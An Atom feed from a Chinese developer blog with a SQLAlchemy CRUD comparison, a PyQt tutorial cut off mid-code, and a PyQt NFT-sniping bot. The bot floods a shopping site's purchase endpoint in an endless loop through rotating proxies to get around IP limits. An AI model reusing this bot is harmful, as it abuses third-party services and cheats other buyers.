@@ -1,0 +1,1710 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><title type="text">ifish</title><subtitle type="html">愿学有所成，问有所得，静有所思，而私有所惘</subtitle><updated>2023-01-01T18:53:10+08:00</updated><id>https://if1sh.com/</id><link rel="alternate" type="text/html" href="https://if1sh.com/"/><link rel="self" type="application/atom+xml" href="https://if1sh.com/atom.xml"/><author><name>ifish</name><uri>https://if1sh.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><generator uri="https://gohugo.io/" version="0.108.0">Hugo</generator><entry><title type="text">tortoise和sqlalchemy写法对比</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/tortoise%E5%92%8Csqlalchemy%E5%86%99%E6%B3%95%E5%AF%B9%E6%AF%94/"/><id>https://if1sh.com/posts/tortoise%E5%92%8Csqlalchemy%E5%86%99%E6%B3%95%E5%AF%B9%E6%AF%94/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2023-01-01T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">tortoise和sqlalchemy写法对比 初步对比了增删改查，sqlalchem……</summary><content type="html">&lt;h1 id="tortoise和sqlalchemy写法对比">tortoise和sqlalchemy写法对比&lt;/h1>
+&lt;p>初步对比了增删改查，sqlalchemy可以改为半自动commit&lt;/p>
+&lt;pre tabindex="0">&lt;code>from fastapi import APIRouter
+from fastapi.encoders import jsonable_encoder
+from sqlalchemy import select, update, delete
+from common.schemas import R
+from common.utils import list2tree
+from db.midd import db
+from models.menu import Menu
+from models.sys_menu import SysMenu
+from schemas.menu import MenuInfo, MenuSchema, MenuTree
+router = APIRouter(prefix=&amp;#34;/menu&amp;#34;, tags=[&amp;#34;菜单管理&amp;#34;])
+@router.get(&amp;#34;&amp;#34;, summary=&amp;#34;菜单🌲&amp;#34;, response_model=R[MenuTree])
+async def query_menu():
+&amp;#34;&amp;#34;&amp;#34;
+菜单列表-tree
+:return:
+&amp;#34;&amp;#34;&amp;#34;
+# data1 = await Menu.all().values()
+# print(data1)
+# print(db.session.execute(select(SysMenu)).scalars().all())
+# print(db.session.execute(select(SysMenu)).all())
+data = db.session.execute(select(SysMenu)).scalars().all()
+# tuple转为dict
+data = jsonable_encoder(data)
+return R.success(data=list2tree(data))
+@router.post(&amp;#34;&amp;#34;, summary=&amp;#34;创建菜单&amp;#34;, response_model=R[MenuInfo])
+async def add_menu(menu_schema: MenuSchema):
+&amp;#34;&amp;#34;&amp;#34;
+新增菜单
+:param menu_schema:
+:return:
+&amp;#34;&amp;#34;&amp;#34;
+# obj = await Menu.create(**menu_schema.dict())
+obj = SysMenu(**menu_schema.dict())
+db.session.add(obj)
+db.session.commit()
+print(obj)
+return R.success(data=obj)
+@router.put(&amp;#34;/{id}&amp;#34;, summary=&amp;#34;更新菜单&amp;#34;, response_model=R[MenuInfo])
+async def edit_menu(id: int, menu_schema: MenuSchema):
+&amp;#34;&amp;#34;&amp;#34;
+更新菜单
+:param id:
+:param menu_schema:
+:return:
+&amp;#34;&amp;#34;&amp;#34;
+# await Menu.filter(id=id).update(**menu_schema.dict())
+# data = await Menu.get_or_none(id=id)
+stmt = update(SysMenu).filter(SysMenu.id == id).values(**menu_schema.dict())
+db.session.execute(stmt)
+db.session.commit()
+data = db.session.execute(select(SysMenu).filter(SysMenu.id == id)).scalar()
+print(data)
+return R.success(data=data)
+@router.delete(&amp;#34;/{id}&amp;#34;, summary=&amp;#34;删除菜单&amp;#34;, response_model=R)
+async def del_menu(id: int):
+&amp;#34;&amp;#34;&amp;#34;
+删除菜单
+:param id:
+:return:
+逻辑删除 修改状态
+&amp;#34;&amp;#34;&amp;#34;
+# 伪删除
+# await Menu.filter(id=id).update(status=9)
+stmt = update(SysMenu).filter(SysMenu.id == id).values(status=9)
+db.session.execute(stmt)
+db.session.commit()
+# 删除
+# stmt = delete(SysMenu).filter(SysMenu.id == id).filter()
+# db.session.execute(stmt)
+# db.session.commit()
+return R.success()
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E5%BC%80%E5%8F%91/" term="开发" label="开发"/><category scheme="https://if1sh.com/tags/tortoise/" term="tortoise" label="tortoise"/><category scheme="https://if1sh.com/tags/sqlalchemy/" term="sqlalchemy" label="sqlalchemy"/></entry><entry><title type="text">pyqt抢购nft</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/pyqt%E6%8A%A2%E8%B4%ADnft/"/><id>https://if1sh.com/posts/pyqt%E6%8A%A2%E8%B4%ADnft/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-06-19T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">pyqt抢购nft core # -*- coding: utf-8 -*- import multiprocessing import sys import time from PyQt5.QtCore import QThread, pyqtSignal from PyQt5.QtWidgets import QApplication, QMainWindow from qiankunui import Ui_MainWindow import requests import cgitb from datetime import……</summary><content type="html">&lt;h1 id="pyqt抢购nft">pyqt抢购nft&lt;/h1>
+&lt;p>core&lt;/p>
+&lt;pre tabindex="0">&lt;code>
+# -*- coding: utf-8 -*-
+import multiprocessing
+import sys
+import time
+from PyQt5.QtCore import QThread, pyqtSignal
+from PyQt5.QtWidgets import QApplication, QMainWindow
+from qiankunui import Ui_MainWindow
+import requests
+import cgitb
+from datetime import datetime
+from apscheduler.schedulers.blocking import BlockingScheduler
+from apscheduler.schedulers.qt import QtScheduler
+from itertools import cycle
+from requests.packages import urllib3
+urllib3.disable_warnings()
+cgitb.enable(format=&amp;#39;text&amp;#39;)
+class MyMainForm(QMainWindow, Ui_MainWindow):
+def __init__(self, parent=None):
+super(MyMainForm, self).__init__(parent)
+self.setupUi(self)
+# 2.手动多线程发包
+self.work = WorkThread(self)
+self.start.clicked.connect(self.execute)
+self.stop.clicked.connect(self.stoping)
+# 1.登录
+self.ui_login = Login(self)
+self.login.clicked.connect(self.start_login)
+# 3.auto
+self.auto_buy.clicked.connect(self.auto_buy1)
+def auto_buy1(self):
+self.work.auto_buy()
+self.work.trigger.connect(self.display)
+def start_login(self):
+self.ui_login.start()
+self.ui_login.trigger.connect(self.display)
+def stoping(self):
+self.work.stop()
+self.work.trigger.connect(self.display)
+def execute(self):
+# 启动线程
+self.work.start()
+# 线程自定义信号连接的槽函数
+self.work.trigger.connect(self.display)
+def display(self, str):
+# 由于自定义信号时自动传递一个字符串参数，所以在这个槽函数中要接受一个参数
+self.listWidget.addItem(str)
+class Login(QThread):
+trigger = pyqtSignal(str)
+def __init__(self, demo):
+super(Login, self).__init__()
+self.demo = demo
+def run(self):
+username = self.demo.username.text().strip()
+password = self.demo.password.text().strip()
+try:
+burp0_url = &amp;#34;https://x.com&amp;#34;
+burp0_headers = {&amp;#34;Sec-Ch-Ua&amp;#34;: &amp;#34;\&amp;#34;(Not(A:Brand\&amp;#34;;v=\&amp;#34;8\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;101\&amp;#34;&amp;#34;, &amp;#34;Sid&amp;#34;: &amp;#34;35001800000&amp;#34;,
+&amp;#34;Sec-Ch-Ua-Mobile&amp;#34;: &amp;#34;?0&amp;#34;,
+&amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&amp;#34;,
+&amp;#34;Content-Type&amp;#34;: &amp;#34;application/x-www-form-urlencoded&amp;#34;, &amp;#34;Newversion&amp;#34;: &amp;#34;H5_1.0&amp;#34;,
+&amp;#34;Sec-Ch-Ua-Platform&amp;#34;: &amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;, &amp;#34;Source&amp;#34;: &amp;#34;218&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;,
+&amp;#34;Origin&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn&amp;#34;, &amp;#34;Sec-Fetch-Site&amp;#34;: &amp;#34;cross-site&amp;#34;,
+&amp;#34;Sec-Fetch-Mode&amp;#34;: &amp;#34;cors&amp;#34;, &amp;#34;Sec-Fetch-Dest&amp;#34;: &amp;#34;empty&amp;#34;,
+&amp;#34;Referer&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn/&amp;#34;,
+&amp;#34;Accept-Encoding&amp;#34;: &amp;#34;gzip, deflate&amp;#34;, &amp;#34;Accept-Language&amp;#34;: &amp;#34;zh-CN,zh;q=0.9&amp;#34;,
+&amp;#34;Connection&amp;#34;: &amp;#34;close&amp;#34;}
+burp0_data = {&amp;#34;phone&amp;#34;: f&amp;#34;{username}&amp;#34;, &amp;#34;loginPwd&amp;#34;: f&amp;#34;{password}&amp;#34;}
+res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
+except Exception as e:
+print(e)
+res_json = res.json()
+print(res_json[&amp;#34;data&amp;#34;][&amp;#34;loginSign&amp;#34;])
+self.trigger.emit(res.text)
+self.demo.token.setText(res_json[&amp;#34;data&amp;#34;][&amp;#34;loginSign&amp;#34;])
+self.demo.userid.setText(res_json[&amp;#34;data&amp;#34;][&amp;#34;userId&amp;#34;])
+class WorkThread(QThread):
+# 自定义信号对象。参数str就代表这个信号可以传一个字符串
+trigger = pyqtSignal(str)
+def __init__(self, demo): # 3
+super(WorkThread, self).__init__()
+self.demo = demo
+self.pool = None
+def callback(self, x):
+self.trigger.emit(x)
+# 主要启动函数
+def run(self):
+# 重写线程执行的run函数
+# 触发自定义信号
+userid = self.demo.userid.text().strip()
+token = self.demo.token.text().strip()
+goodsid = self.demo.goodsid.text().strip()
+issueid = self.demo.issueid.text().strip()
+_proxy = self.demo.proxy_pool.text().strip()
+try:
+res = requests.get(_proxy)
+self.ips = res.text.splitlines()
+except Exception as e:
+print(e)
+self.pool = multiprocessing.Pool()
+for ip in cycle(self.ips):
+self.pool.apply_async(self.work, (userid, token, goodsid, issueid, ip), error_callback=self.callback,
+callback=self.callback)
+self.pool.close()
+self.pool.join()
+@staticmethod
+def work(userid, token, goodsid, issueid, ip=None):
+proxies = {&amp;#34;http&amp;#34;: ip, &amp;#34;https&amp;#34;: ip}
+burp0_url = &amp;#34;https://x&amp;#34;
+burp0_headers = {&amp;#34;Sec-Ch-Ua&amp;#34;: &amp;#34;\&amp;#34;(Not(A:Brand\&amp;#34;;v=\&amp;#34;8\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;101\&amp;#34;&amp;#34;, &amp;#34;Sid&amp;#34;: &amp;#34;35001800000&amp;#34;,
+&amp;#34;Sec-Ch-Ua-Mobile&amp;#34;: &amp;#34;?0&amp;#34;,
+&amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&amp;#34;,
+&amp;#34;Content-Type&amp;#34;: &amp;#34;application/x-www-form-urlencoded&amp;#34;, &amp;#34;Newversion&amp;#34;: &amp;#34;H5_1.0&amp;#34;,
+&amp;#34;Loginsign&amp;#34;: f&amp;#34;{token}&amp;#34;, &amp;#34;Sec-Ch-Ua-Platform&amp;#34;: &amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;,
+&amp;#34;Source&amp;#34;: &amp;#34;218&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;, &amp;#34;Origin&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn&amp;#34;,
+&amp;#34;Sec-Fetch-Site&amp;#34;: &amp;#34;cross-site&amp;#34;, &amp;#34;Sec-Fetch-Mode&amp;#34;: &amp;#34;cors&amp;#34;, &amp;#34;Sec-Fetch-Dest&amp;#34;: &amp;#34;empty&amp;#34;,
+&amp;#34;Referer&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn/&amp;#34;, &amp;#34;Accept-Encoding&amp;#34;: &amp;#34;gzip, deflate&amp;#34;,
+&amp;#34;Accept-Language&amp;#34;: &amp;#34;zh-CN,zh;q=0.9&amp;#34;, &amp;#34;Connection&amp;#34;: &amp;#34;close&amp;#34;}
+burp0_data = {&amp;#34;userId&amp;#34;: f&amp;#34;{userid}&amp;#34;, &amp;#34;goodsId&amp;#34;: f&amp;#34;{goodsid}&amp;#34;, &amp;#34;issueId&amp;#34;: f&amp;#34;{issueid}&amp;#34;}
+try:
+res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies)
+except:
+pass
+time.sleep(0.1)
+# 通过自定义信号把待显示的字符串传递给槽函数
+print(res.text)
+return res.text
+# 停止
+def stop(self):
+print(&amp;#39;stop&amp;#39;)
+self.pool.terminate()
+self.is_running = False
+self.terminate()
+self.trigger.emit(&amp;#34;stop&amp;#34;)
+# 定时抢购
+def auto_buy(self):
+ss = self.demo.ss.text().strip()
+y = self.demo.year.text().strip()
+mon = self.demo.mon.text().strip()
+days = self.demo.days.text().strip()
+hours = self.demo.hours.text().strip()
+mins = self.demo.mins.text().strip()
+scheduler = QtScheduler()
+scheduler.add_job(self.run, &amp;#39;date&amp;#39;,
+run_date=datetime(int(y), int(mon), int(days), int(hours), int(mins), int(ss)),
+)
+scheduler.start()
+if __name__ == &amp;#34;__main__&amp;#34;:
+app = QApplication(sys.argv)
+myWin = MyMainForm()
+myWin.show()
+sys.exit(app.exec_())
+&lt;/code>&lt;/pre>&lt;p>ui&lt;/p>
+&lt;pre tabindex="0">&lt;code># -*- coding: utf-8 -*-
+from PyQt5 import QtCore, QtGui, QtWidgets
+class Ui_MainWindow(object):
+def setupUi(self, MainWindow):
+MainWindow.setObjectName(&amp;#34;MainWindow&amp;#34;)
+MainWindow.resize(754, 415)
+self.centralwidget = QtWidgets.QWidget(MainWindow)
+self.centralwidget.setObjectName(&amp;#34;centralwidget&amp;#34;)
+self.listWidget = QtWidgets.QListWidget(self.centralwidget)
+self.listWidget.setGeometry(QtCore.QRect(340, 10, 371, 311))
+self.listWidget.setObjectName(&amp;#34;listWidget&amp;#34;)
+self.code = QtWidgets.QPushButton(self.centralwidget)
+self.code.setGeometry(QtCore.QRect(250, 70, 75, 23))
+self.code.setObjectName(&amp;#34;code&amp;#34;)
+self.label = QtWidgets.QLabel(self.centralwidget)
+self.label.setGeometry(QtCore.QRect(50, 70, 54, 20))
+self.label.setObjectName(&amp;#34;label&amp;#34;)
+self.label_2 = QtWidgets.QLabel(self.centralwidget)
+self.label_2.setGeometry(QtCore.QRect(20, 100, 71, 20))
+self.label_2.setObjectName(&amp;#34;label_2&amp;#34;)
+self.username = QtWidgets.QLineEdit(self.centralwidget)
+self.username.setGeometry(QtCore.QRect(100, 70, 113, 20))
+self.username.setObjectName(&amp;#34;username&amp;#34;)
+self.password = QtWidgets.QLineEdit(self.centralwidget)
+self.password.setGeometry(QtCore.QRect(100, 100, 113, 20))
+self.password.setObjectName(&amp;#34;password&amp;#34;)
+self.login = QtWidgets.QPushButton(self.centralwidget)
+self.login.setGeometry(QtCore.QRect(250, 100, 75, 23))
+self.login.setObjectName(&amp;#34;login&amp;#34;)
+self.start = QtWidgets.QPushButton(self.centralwidget)
+self.start.setGeometry(QtCore.QRect(550, 340, 75, 23))
+self.start.setObjectName(&amp;#34;start&amp;#34;)
+self.stop = QtWidgets.QPushButton(self.centralwidget)
+self.stop.setGeometry(QtCore.QRect(640, 340, 75, 23))
+self.stop.setObjectName(&amp;#34;stop&amp;#34;)
+self.label_3 = QtWidgets.QLabel(self.centralwidget)
+self.label_3.setGeometry(QtCore.QRect(20, 130, 71, 20))
+self.label_3.setObjectName(&amp;#34;label_3&amp;#34;)
+self.token = QtWidgets.QLineEdit(self.centralwidget)
+self.token.setGeometry(QtCore.QRect(100, 130, 113, 20))
+self.token.setObjectName(&amp;#34;token&amp;#34;)
+self.userid = QtWidgets.QLineEdit(self.centralwidget)
+self.userid.setGeometry(QtCore.QRect(100, 170, 113, 20))
+self.userid.setObjectName(&amp;#34;userid&amp;#34;)
+self.issueid = QtWidgets.QLineEdit(self.centralwidget)
+self.issueid.setGeometry(QtCore.QRect(100, 210, 113, 20))
+self.issueid.setObjectName(&amp;#34;issueid&amp;#34;)
+self.label_4 = QtWidgets.QLabel(self.centralwidget)
+self.label_4.setGeometry(QtCore.QRect(20, 170, 71, 20))
+self.label_4.setObjectName(&amp;#34;label_4&amp;#34;)
+self.label_5 = QtWidgets.QLabel(self.centralwidget)
+self.label_5.setGeometry(QtCore.QRect(20, 210, 71, 20))
+self.label_5.setObjectName(&amp;#34;label_5&amp;#34;)
+self.label_6 = QtWidgets.QLabel(self.centralwidget)
+self.label_6.setGeometry(QtCore.QRect(20, 240, 71, 20))
+self.label_6.setObjectName(&amp;#34;label_6&amp;#34;)
+self.goodsid = QtWidgets.QLineEdit(self.centralwidget)
+self.goodsid.setGeometry(QtCore.QRect(100, 240, 113, 20))
+self.goodsid.setObjectName(&amp;#34;goodsid&amp;#34;)
+self.label_7 = QtWidgets.QLabel(self.centralwidget)
+self.label_7.setGeometry(QtCore.QRect(20, 270, 71, 20))
+self.label_7.setObjectName(&amp;#34;label_7&amp;#34;)
+self.proxy_pool = QtWidgets.QLineEdit(self.centralwidget)
+self.proxy_pool.setGeometry(QtCore.QRect(100, 270, 113, 20))
+self.proxy_pool.setObjectName(&amp;#34;proxy_pool&amp;#34;)
+self.year = QtWidgets.QLineEdit(self.centralwidget)
+self.year.setGeometry(QtCore.QRect(40, 340, 31, 21))
+self.year.setText(&amp;#34;&amp;#34;)
+self.year.setObjectName(&amp;#34;year&amp;#34;)
+self.label_8 = QtWidgets.QLabel(self.centralwidget)
+self.label_8.setGeometry(QtCore.QRect(20, 340, 21, 21))
+self.label_8.setObjectName(&amp;#34;label_8&amp;#34;)
+self.mon = QtWidgets.QLineEdit(self.centralwidget)
+self.mon.setGeometry(QtCore.QRect(100, 340, 31, 21))
+self.mon.setText(&amp;#34;&amp;#34;)
+self.mon.setObjectName(&amp;#34;mon&amp;#34;)
+self.label_9 = QtWidgets.QLabel(self.centralwidget)
+self.label_9.setGeometry(QtCore.QRect(80, 340, 21, 21))
+self.label_9.setObjectName(&amp;#34;label_9&amp;#34;)
+self.days = QtWidgets.QLineEdit(self.centralwidget)
+self.days.setGeometry(QtCore.QRect(160, 340, 31, 21))
+self.days.setText(&amp;#34;&amp;#34;)
+self.days.setObjectName(&amp;#34;days&amp;#34;)
+self.label_10 = QtWidgets.QLabel(self.centralwidget)
+self.label_10.setGeometry(QtCore.QRect(140, 340, 21, 21))
+self.label_10.setObjectName(&amp;#34;label_10&amp;#34;)
+self.hours = QtWidgets.QLineEdit(self.centralwidget)
+self.hours.setGeometry(QtCore.QRect(220, 340, 31, 21))
+self.hours.setText(&amp;#34;&amp;#34;)
+self.hours.setObjectName(&amp;#34;hours&amp;#34;)
+self.label_11 = QtWidgets.QLabel(self.centralwidget)
+self.label_11.setGeometry(QtCore.QRect(200, 340, 21, 21))
+self.label_11.setObjectName(&amp;#34;label_11&amp;#34;)
+self.mins = QtWidgets.QLineEdit(self.centralwidget)
+self.mins.setGeometry(QtCore.QRect(280, 340, 31, 21))
+self.mins.setText(&amp;#34;&amp;#34;)
+self.mins.setObjectName(&amp;#34;mins&amp;#34;)
+self.label_12 = QtWidgets.QLabel(self.centralwidget)
+self.label_12.setGeometry(QtCore.QRect(260, 340, 21, 21))
+self.label_12.setObjectName(&amp;#34;label_12&amp;#34;)
+self.ss = QtWidgets.QLineEdit(self.centralwidget)
+self.ss.setGeometry(QtCore.QRect(340, 340, 31, 21))
+self.ss.setText(&amp;#34;&amp;#34;)
+self.ss.setObjectName(&amp;#34;ss&amp;#34;)
+self.label_13 = QtWidgets.QLabel(self.centralwidget)
+self.label_13.setGeometry(QtCore.QRect(320, 340, 21, 21))
+self.label_13.setObjectName(&amp;#34;label_13&amp;#34;)
+self.auto_buy = QtWidgets.QPushButton(self.centralwidget)
+self.auto_buy.setGeometry(QtCore.QRect(390, 340, 75, 23))
+self.auto_buy.setObjectName(&amp;#34;auto_buy&amp;#34;)
+MainWindow.setCentralWidget(self.centralwidget)
+self.menubar = QtWidgets.QMenuBar(MainWindow)
+self.menubar.setGeometry(QtCore.QRect(0, 0, 754, 23))
+self.menubar.setObjectName(&amp;#34;menubar&amp;#34;)
+MainWindow.setMenuBar(self.menubar)
+self.statusbar = QtWidgets.QStatusBar(MainWindow)
+self.statusbar.setObjectName(&amp;#34;statusbar&amp;#34;)
+MainWindow.setStatusBar(self.statusbar)
+self.retranslateUi(MainWindow)
+QtCore.QMetaObject.connectSlotsByName(MainWindow)
+def retranslateUi(self, MainWindow):
+_translate = QtCore.QCoreApplication.translate
+MainWindow.setWindowTitle(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;MainWindow&amp;#34;))
+self.code.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;发送验证码&amp;#34;))
+self.label.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;账号&amp;#34;))
+self.label_2.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;密码|验证码&amp;#34;))
+self.username.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;&amp;#34;))
+self.password.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;&amp;#34;))
+self.login.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;登录&amp;#34;))
+self.start.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;手动&amp;#34;))
+self.stop.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;停止&amp;#34;))
+self.label_3.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;token&amp;#34;))
+self.label_4.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;userid&amp;#34;))
+self.label_5.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;issueid&amp;#34;))
+self.label_6.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;goodsid&amp;#34;))
+self.label_7.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;proxy_pool&amp;#34;))
+self.label_8.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;年&amp;#34;))
+self.label_9.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;月&amp;#34;))
+self.label_10.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;日&amp;#34;))
+self.label_11.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;时&amp;#34;))
+self.label_12.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;分&amp;#34;))
+self.label_13.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;秒&amp;#34;))
+self.auto_buy.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;定时抢购&amp;#34;))
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/tags/gui/" term="gui" label="gui"/></entry><entry><title type="text">pyqt</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/pyqt%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8/"/><id>https://if1sh.com/posts/pyqt%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-04-04T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">pyqt极速入门 安装 安装pyqt pip install pyqt5 安装简化版qt designer https://build-system.fman.io/qt-designer-download qt designer 先用qt designer……</summary><content type="html">&lt;h1 id="pyqt极速入门">pyqt极速入门&lt;/h1>
+&lt;h2 id="安装">安装&lt;/h2>
+&lt;pre tabindex="0">&lt;code>安装pyqt
+pip install pyqt5
+安装简化版qt designer
+https://build-system.fman.io/qt-designer-download
+&lt;/code>&lt;/pre>&lt;h2 id="qt-designer">qt designer&lt;/h2>
+&lt;p>先用qt designer画框&lt;/p>
+&lt;p>然后将ui转为py代码&lt;/p>
+&lt;pre tabindex="0">&lt;code>pyuic5 -o destination.py original.ui
+&lt;/code>&lt;/pre>&lt;p>ui demo&lt;/p>
+&lt;pre tabindex="0">&lt;code># -*- coding: utf-8 -*-
+# Form implementation generated from reading ui file &amp;#39;C:\Users\david\Desktop\untitled.ui&amp;#39;
+#
+# Created by: PyQt5 UI code generator 5.15.4
+#
+# WARNING: Any manual changes made to this file will be lost when pyuic5 is
+# run again. Do not edit this file unless you know what you are doing.
+from PyQt5 import QtCore, QtGui, QtWidgets
+class Ui_Form(object):
+def setupUi(self, Form):
+Form.setObjectName(&amp;#34;Form&amp;#34;)
+Form.resize(808, 508)
+self.textBrowser = QtWidgets.QTextBrowser(Form)
+self.textBrowser.setGeometry(QtCore.QRect(10, 230, 781, 291))
+self.textBrowser.setObjectName(&amp;#34;textBrowser&amp;#34;)
+self.groupBox = QtWidgets.QGroupBox(Form)
+self.groupBox.setGeometry(QtCore.QRect(10, 20, 781, 181))
+self.groupBox.setTitle(&amp;#34;&amp;#34;)
+self.groupBox.setObjectName(&amp;#34;groupBox&amp;#34;)
+self.label = QtWidgets.QLabel(self.groupBox)
+self.label.setGeometry(QtCore.QRect(10, 30, 54, 12))
+self.label.setObjectName(&amp;#34;label&amp;#34;)
+self.pushButton = QtWidgets.QPushButton(self.groupBox)
+self.pushButton.setGeometry(QtCore.QRect(454, 22, 71, 31))
+self.pushButton.setObjectName(&amp;#34;pushButton&amp;#34;)
+self.lineEdit = QtWidgets.QLineEdit(self.groupBox)
+self.lineEdit.setGeometry(QtCore.QRect(90, 20, 291, 31))
+self.lineEdit.setObjectName(&amp;#34;lineEdit&amp;#34;)
+self.pushButton_2 = QtWidgets.QPushButton(self.groupBox)
+self.pushButton_2.setGeometry(QtCore.QRect(540, 20, 81, 31))
+self.pushButton_2.setObjectName(&amp;#34;pushButton_2&amp;#34;)
+self.label_2 = QtWidgets.QLabel(Form)
+self.label_2.setGeometry(QtCore.QRect(10, 210, 54, 12))
+self.label_2.setObjectName(&amp;#34;label_2&amp;#34;)
+self.retranslateUi(Form)
+QtCore.QMetaObject.connectSlotsByName(Form)
+def retranslateUi(self, Form):
+_translate = QtCore.QCoreApplication.translate
+Form.setWindowTitle(_translate(&amp;#34;Form&amp;#34;, &amp;#34;script boy tools&amp;#34;))
+self.label.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;url&amp;#34;))
+self.pushButton.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;attack&amp;#34;))
+self.pushButton_2.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;stop&amp;#34;))
+self.label_2.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;log&amp;#34;))
+&lt;/code>&lt;/pre>&lt;p>将designer.py和编写逻辑的py放在同一目录，以便引用&lt;/p>
+&lt;p>test.py&lt;/p>
+&lt;pre tabindex="0">&lt;code>import sys
+from PyQt5.QtWidgets import QApplication, QWidget
+from designer import Ui_Form
+class Demo(QWidget, Ui_Form):
+def __init__(self):
+super(Demo, self).__init__()
+self.setupUi(self) # 1
+self.text_edit.textChanged.connect(self.show_text_func) # 2
+def show_text_func(self):
+self.text_browser.setText(self.text_edit.toPlainText())
+if __name__ == &amp;#39;__main__&amp;#39;:
+app = QApplication(sys.argv)
+demo = Demo()
+demo.show()
+sys.exit(app.exec_())
+&lt;/code>&lt;/pre>&lt;ol>
+&lt;li>
+&lt;p>将UI界面布局到Demo上；&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>将self.text_edit的textChanged信号连接到自定义的槽函数上，在槽函数中我们将self.text_browser的文本设为self.text_edit的文本。&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="signal和slot">signal和slot&lt;/h2>
+&lt;p>pyqt核心就是信号和槽，用来传递指令和执行指令&lt;/p>
+&lt;p>控件有很多属性，比如说按钮被点击，点击就是一种信号，可以连接槽函数来执行内容&lt;/p>
+&lt;p>这是一个信号连接一个槽连接的例子&lt;/p>
+&lt;p>还有多个信号连接一个槽、信号连接信号、一个信号连接多个槽、自定义信号&lt;/p>
+&lt;pre tabindex="0">&lt;code>import sys
+from PyQt5.QtWidgets import QApplication, QWidget, QPushButton
+class Demo(QWidget): # 1
+def __init__(self):
+super(Demo, self).__init__()
+self.button = QPushButton(&amp;#39;Start&amp;#39;, self) # 2
+self.button.clicked.connect(self.change_text) # 3
+def change_text(self):
+print(&amp;#39;change text&amp;#39;)
+self.button.setText(&amp;#39;Stop&amp;#39;) # 4
+self.button.clicked.disconnect(self.change_text) # 5
+if __name__ == &amp;#39;__main__&amp;#39;:
+app = QApplication(sys.argv)
+demo = Demo() # 6
+demo.show() # 7
+sys.exit(app.exec_())
+&lt;/code>&lt;/pre>&lt;h2 id="在线程中获取窗口内容">在线程中获取窗口内容&lt;/h2>
+&lt;p>ui线程只能用来跑ui，要执行业务逻辑得多开一个线程，防止窗口阻塞&lt;/p>
+&lt;p>获取输入框的内容&lt;/p>
+&lt;pre tabindex="0">&lt;code>import sys
+from PyQt5.QtCore import QThread
+from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLineEdit, QLabel, QVBoxLayout, QHBoxLayout
+class Demo(QWidget):
+def __init__(self):
+super(Demo, self).__init__()
+self.line = QLineEdit()
+self.btn = QPushButton(&amp;#39;开始爬取&amp;#39;)
